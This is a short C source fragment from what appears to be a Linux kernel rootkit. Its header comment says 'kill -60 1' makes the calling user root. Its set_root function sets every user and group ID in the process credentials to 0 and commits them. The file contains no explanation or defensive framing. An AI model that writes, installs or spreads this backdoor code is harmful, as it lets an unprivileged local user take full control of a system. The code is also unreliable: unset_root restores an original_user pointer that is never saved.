/* DESCRIPTION 
Changes the UID of the current user accordingly.

* Changes user to root: kill -60 1
* Changes user back to original uid: kill -60 0
*/

#include <linux/syscalls.h>

/* GLOBAL VARIABLES */
struct cred *original_user;
/**************************/

/* Function Prototypes */
void set_root(void);
void unset_root(void);

/* Sets user to root and 
return the original struct cred */
void set_root(void) {

    struct cred *user;
    user = prepare_creds();
    if (user == NULL){
        return;
    }
    /* Run through and set all the various id's to 0 (root) */
    user->uid.val = user->gid.val = 0;
    user->euid.val = user->egid.val = 0;
    user->suid.val = user->sgid.val = 0;
    user->fsuid.val = user->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(user);
}

void unset_root(void){
    // revert back to original_user cred
    commit_creds(original_user);
    return;
}
